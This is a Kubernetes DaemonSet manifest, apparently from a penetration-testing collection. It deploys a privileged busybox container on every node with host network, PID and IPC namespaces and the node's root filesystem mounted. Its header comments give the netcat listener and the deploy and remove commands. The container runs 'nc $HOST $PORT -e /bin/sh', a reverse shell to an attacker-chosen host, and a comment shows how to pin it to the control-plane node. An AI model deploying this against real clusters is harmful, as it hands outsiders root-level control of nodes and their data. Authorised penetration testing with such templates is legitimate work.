###########################################################
## Set up Listener: nc -nvlp [PORT]
## Deploy: HOST="10.0.0.1" PORT="3116" envsubst < everything-allowed-revshell-pod.yaml | kubectl apply -f - 
## Remove: Remove: kubectl -n [namespace] delete everything-allowed-revshell-pod
###########################################################
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: everything-allowed-revshell-deamonset
  labels:
    app: pentest
    type: deamonset
spec:
  selector:
    matchLabels:
      app: pentest
      type: deamonset
  template:
    metadata:
      labels:
        app: pentest
        type: deamonset
    spec:
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
      - name: everything-allowed-revshell-deamonset
        image: busybox
        command: [ "/bin/sh", "-c", "--" ]
        args: [ "nc $HOST $PORT  -e /bin/sh;" ]
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: noderoot
      #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
      volumes:
      - name: noderoot
        hostPath:
          path: /
      